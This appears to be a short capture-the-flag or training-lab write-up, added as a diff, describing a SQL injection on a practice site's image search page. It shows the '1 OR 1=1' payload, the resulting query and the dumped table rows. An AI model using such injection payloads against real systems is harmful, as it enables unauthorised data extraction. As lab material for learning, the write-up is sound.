@@ -1,0 +1,23 @@
+After finding injection on members page, this search image page made the same request
+but on searchimg.php file and searchimg id column from table;
+
+so writting 1 OR 1=1 we set the query statement to true for every value.
+
+searchimg = 1 OR 1=1
+SELECT id, Title, Url FROM table WHERE id=searchimg;
+
+ID: 1 OR 1=1 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_
+ID: 1 OR 1=1 
+Title: 42 !
+Url : https://fr.wikipedia.org/wiki/Fichier:42
+ID: 1 OR 1=1 
+Title: Google
+Url : https://fr.wikipedia.org/wiki/Logo_de_Go
+ID: 1 OR 1=1 
+Title: Earth
+Url : https://en.wikipedia.org/wiki/Earth#/med
+ID: 1 OR 1=1 
+Title: Hack me ?
+Url : borntosec.ddns.net/images.png
